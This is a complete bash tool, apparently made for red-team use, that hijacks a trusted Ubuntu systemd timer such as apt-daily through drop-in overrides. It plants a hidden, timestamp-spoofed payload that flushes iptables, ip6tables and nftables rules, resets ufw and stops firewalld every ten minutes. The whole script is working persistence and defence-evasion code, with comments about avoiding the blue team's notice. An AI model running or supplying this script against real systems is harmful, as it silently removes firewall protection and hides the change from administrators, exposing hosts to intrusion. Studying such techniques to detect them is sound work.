#!/usr/bin/env bash
# =============================================================================
# poison-timer.sh — Hijack a trusted Ubuntu systemd timer via drop-in override
#
# Technique: systemd drop-in files (/etc/systemd/system/<svc>.d/override.conf)
# let us inject ExecStartPost into any existing service WITHOUT touching the
# original unit file. The original service continues working normally — the
# firewall flush just piggybacks on every execution.
#
# We also drop-in the paired timer to increase its firing frequency to every
# N minutes (default: 10), so firewalls are cleared on a tight loop.
#
# Reversible: remove = delete the two drop-in dirs + hidden script.
# Original unit files are NEVER modified.
#
# Usage:
#   sudo ./poison-timer.sh install  [--target <timer-name>] [--interval <minutes>]
#   sudo ./poison-timer.sh remove   [--target <timer-name>]
#   sudo ./poison-timer.sh status
#   sudo ./poison-timer.sh list     # show candidate timers on this host
#
# Defaults:
#   --target    auto-selected (first available from priority list)
#   --interval  10  (minutes between firewall flushes)
# =============================================================================

set -euo pipefail

# ── Defaults ─────────────────────────────────────────────────────────────────
TARGET_TIMER=""          # auto-selected if empty
INTERVAL_MIN=10

# Hidden payload script — name blends with system tooling
PAYLOAD="/usr/local/lib/.sysfwsync"

# Priority list: timers that exist on nearly every Ubuntu 24.04 install,
# run as root, and whose absence from the log wouldn't alarm blue team.
CANDIDATES=(
    "apt-daily.timer"
    "man-db.timer"
    "logrotate.timer"
    "fstrim.timer"
    "e2scrub_reap.timer"
    "systemd-tmpfiles-clean.timer"
    "dpkg-db-backup.timer"
    "motd-news.timer"
    "ua-timer.timer"
)

# ── Helpers ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
die()  { echo -e "${RED}[-]${NC} $*" >&2; exit 1; }
require_root() { [[ $EUID -eq 0 ]] || die "Run as root: sudo $0 $*"; }

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --target)   TARGET_TIMER="$2"; shift 2 ;;
            --interval) INTERVAL_MIN="$2"; shift 2 ;;
            *) shift ;;
        esac
    done
}

# Resolve timer name → paired service name (strips .timer, appends .service)
timer_to_service() {
    local t="${1%.timer}"
    echo "${t}.service"
}

# Auto-select the best available timer from the candidate list
pick_target() {
    for t in "${CANDIDATES[@]}"; do
        if systemctl cat "$t" &>/dev/null 2>&1; then
            echo "$t"
            return
        fi
    done
    die "No suitable timer found. Use --target to specify one manually."
}

# ── install ───────────────────────────────────────────────────────────────────
cmd_install() {
    require_root
    parse_args "$@"

    [[ -z "$TARGET_TIMER" ]] && TARGET_TIMER=$(pick_target)
    # Normalise: ensure .timer suffix
    [[ "$TARGET_TIMER" == *.timer ]] || TARGET_TIMER="${TARGET_TIMER}.timer"
    TARGET_SERVICE=$(timer_to_service "$TARGET_TIMER")

    # Verify both units actually exist on this host
    systemctl cat "$TARGET_TIMER"   &>/dev/null || die "Timer not found: $TARGET_TIMER"
    systemctl cat "$TARGET_SERVICE" &>/dev/null || die "Service not found: $TARGET_SERVICE"

    TIMER_DROPIN_DIR="/etc/systemd/system/${TARGET_TIMER}.d"
    SERVICE_DROPIN_DIR="/etc/systemd/system/${TARGET_SERVICE}.d"

    hdr "Poisoning: $TARGET_TIMER → $TARGET_SERVICE"
    info "Firewall flush every ${INTERVAL_MIN} minutes"
    info "Payload   : $PAYLOAD"

    # ── Step 1: Write the hidden firewall-flush payload ───────────────────────
    hdr "1/4  Writing payload script"
    cat > "$PAYLOAD" <<'PAYLOAD_EOF'
#!/bin/bash
# System firewall synchronization utility

# ── iptables (IPv4) ───────────────────────────────────────────────────────────
if command -v iptables &>/dev/null; then
    for TABLE in filter nat mangle raw security; do
        iptables -t "$TABLE" -F 2>/dev/null || true   # flush all chains
        iptables -t "$TABLE" -X 2>/dev/null || true   # delete user chains
        iptables -t "$TABLE" -Z 2>/dev/null || true   # zero counters
    done
    # Set default policies to ACCEPT on all built-in chains
    iptables -P INPUT   ACCEPT 2>/dev/null || true
    iptables -P FORWARD ACCEPT 2>/dev/null || true
    iptables -P OUTPUT  ACCEPT 2>/dev/null || true
fi

# ── ip6tables (IPv6) ─────────────────────────────────────────────────────────
if command -v ip6tables &>/dev/null; then
    for TABLE in filter nat mangle raw security; do
        ip6tables -t "$TABLE" -F 2>/dev/null || true
        ip6tables -t "$TABLE" -X 2>/dev/null || true
        ip6tables -t "$TABLE" -Z 2>/dev/null || true
    done
    ip6tables -P INPUT   ACCEPT 2>/dev/null || true
    ip6tables -P FORWARD ACCEPT 2>/dev/null || true
    ip6tables -P OUTPUT  ACCEPT 2>/dev/null || true
fi

# ── nftables ─────────────────────────────────────────────────────────────────
if command -v nft &>/dev/null; then
    nft flush ruleset 2>/dev/null || true
fi

# ── ufw ──────────────────────────────────────────────────────────────────────
if command -v ufw &>/dev/null; then
    ufw --force disable 2>/dev/null || true
    # Also reset so re-enabling doesn't just restore old rules
    ufw --force reset   2>/dev/null || true
fi

# ── firewalld ────────────────────────────────────────────────────────────────
if systemctl is-active --quiet firewalld 2>/dev/null; then
    systemctl stop    firewalld 2>/dev/null || true
    systemctl disable firewalld 2>/dev/null || true
fi

exit 0
PAYLOAD_EOF
    chmod 755 "$PAYLOAD"
    # Give it an innocuous timestamp matching other system libs
    touch -r /usr/local/lib "$PAYLOAD" 2>/dev/null || true
    info "Payload written: $PAYLOAD"

    # ── Step 2: Timer drop-in — increase firing frequency ────────────────────
    hdr "2/4  Timer drop-in (fires every ${INTERVAL_MIN} min)"
    mkdir -p "$TIMER_DROPIN_DIR"
    cat > "${TIMER_DROPIN_DIR}/override.conf" <<EOF
[Timer]
# Override: run more frequently so firewall stays flushed
# Original schedule is preserved as a fallback; this adds a repeating trigger
OnBootSec=60s
OnUnitActiveSec=${INTERVAL_MIN}m
RandomizedDelaySec=0
EOF
    info "Timer drop-in: ${TIMER_DROPIN_DIR}/override.conf"

    # ── Step 3: Service drop-in — inject payload into ExecStartPost ──────────
    hdr "3/4  Service drop-in (injects firewall flush)"
    mkdir -p "$SERVICE_DROPIN_DIR"
    cat > "${SERVICE_DROPIN_DIR}/override.conf" <<EOF
[Service]
# Piggyback on the existing service — runs our payload after the real job
ExecStartPost=${PAYLOAD}
EOF
    info "Service drop-in: ${SERVICE_DROPIN_DIR}/override.conf"

    # ── Step 4: Reload + trigger immediately ─────────────────────────────────
    hdr "4/4  Reloading systemd and triggering"
    systemctl daemon-reload

    # Enable the timer in case it was disabled
    systemctl enable "$TARGET_TIMER" --quiet 2>/dev/null || true
    systemctl restart "$TARGET_TIMER" 2>/dev/null || \
        systemctl start "$TARGET_TIMER" 2>/dev/null || true

    # Run the payload RIGHT NOW without waiting for the timer to fire
    bash "$PAYLOAD"
    info "Firewall flushed immediately"

    echo
    info "=== Poison active ==="
    NEXT=$(systemctl show "$TARGET_TIMER" --property=NextElapseUSecRealtime 2>/dev/null \
           | cut -d= -f2 || echo "unknown")
    info "Timer   : $TARGET_TIMER"
    info "Service : $TARGET_SERVICE"
    info "Interval: every ${INTERVAL_MIN} minutes"
    info "Next run: $NEXT"
    echo
    warn "Verify with: sudo iptables -L -n  (should show empty chains, ACCEPT policy)"
}

# ── remove ────────────────────────────────────────────────────────────────────
cmd_remove() {
    require_root
    parse_args "$@"

    [[ -z "$TARGET_TIMER" ]] && TARGET_TIMER=$(pick_target)
    [[ "$TARGET_TIMER" == *.timer ]] || TARGET_TIMER="${TARGET_TIMER}.timer"
    TARGET_SERVICE=$(timer_to_service "$TARGET_TIMER")

    TIMER_DROPIN_DIR="/etc/systemd/system/${TARGET_TIMER}.d"
    SERVICE_DROPIN_DIR="/etc/systemd/system/${TARGET_SERVICE}.d"

    hdr "Removing poison from $TARGET_TIMER"

    rm -rf "$TIMER_DROPIN_DIR"   && info "Removed $TIMER_DROPIN_DIR"   || warn "Not found: $TIMER_DROPIN_DIR"
    rm -rf "$SERVICE_DROPIN_DIR" && info "Removed $SERVICE_DROPIN_DIR" || warn "Not found: $SERVICE_DROPIN_DIR"
    rm -f  "$PAYLOAD"            && info "Removed $PAYLOAD"            || warn "Not found: $PAYLOAD"

    systemctl daemon-reload
    # Restart the timer back to its original schedule
    systemctl restart "$TARGET_TIMER" 2>/dev/null || true
    info "systemd reloaded — timer restored to original schedule"

    echo
    warn "Note: existing iptables state is still empty. Blue team must re-apply"
    warn "      their firewall rules manually (e.g. sudo ufw enable)."
}

# ── status ────────────────────────────────────────────────────────────────────
cmd_status() {
    hdr "Active drop-in overrides"
    for t in "${CANDIDATES[@]}"; do
        SVC=$(timer_to_service "$t")
        TD="/etc/systemd/system/${t}.d/override.conf"
        SD="/etc/systemd/system/${SVC}.d/override.conf"
        if [[ -f "$TD" || -f "$SD" ]]; then
            echo -e "  ${RED}POISONED${NC}  $t / $SVC"
            [[ -f "$TD" ]] && echo "             timer   drop-in: $TD"
            [[ -f "$SD" ]] && echo "             service drop-in: $SD"
        fi
    done

    hdr "Payload"
    if [[ -f "$PAYLOAD" ]]; then
        echo -e "  ${RED}PRESENT${NC}  $PAYLOAD"
        ls -la "$PAYLOAD"
    else
        echo -e "  ${GREEN}ABSENT${NC}"
    fi

    hdr "Current iptables state (should be open if poison is working)"
    iptables -L -n --line-numbers 2>/dev/null | head -20 || warn "iptables not available"

    hdr "ufw status"
    ufw status 2>/dev/null || warn "ufw not available"
}

# ── list ──────────────────────────────────────────────────────────────────────
cmd_list() {
    hdr "Candidate timers present on this host"
    printf "  %-35s %-30s %s\n" "TIMER" "SERVICE" "ACTIVE"
    for t in "${CANDIDATES[@]}"; do
        SVC=$(timer_to_service "$t")
        if systemctl cat "$t" &>/dev/null; then
            ACTIVE=$(systemctl is-active "$t" 2>/dev/null || echo "inactive")
            printf "  %-35s %-30s %s\n" "$t" "$SVC" "$ACTIVE"
        fi
    done
}

# ── dispatch ──────────────────────────────────────────────────────────────────
CMD="${1:-help}"
shift || true
case "$CMD" in
    install) cmd_install "$@" ;;
    remove)  cmd_remove  "$@" ;;
    status)  cmd_status       ;;
    list)    cmd_list         ;;
    *)
        echo "Usage: sudo $0 {install|remove|status|list} [--target <timer>] [--interval <minutes>]"
        echo
        echo "  install  Poison a trusted timer to flush firewalls on a schedule"
        echo "  remove   Remove all drop-ins and payload (restores original timer)"
        echo "  status   Show active poisons and current iptables state"
        echo "  list     Show candidate timers available on this host"
        echo
        echo "  --target <name>      Timer to hijack (e.g. apt-daily.timer)"
        echo "  --interval <min>     Flush frequency in minutes (default: 10)"
        ;;
esac
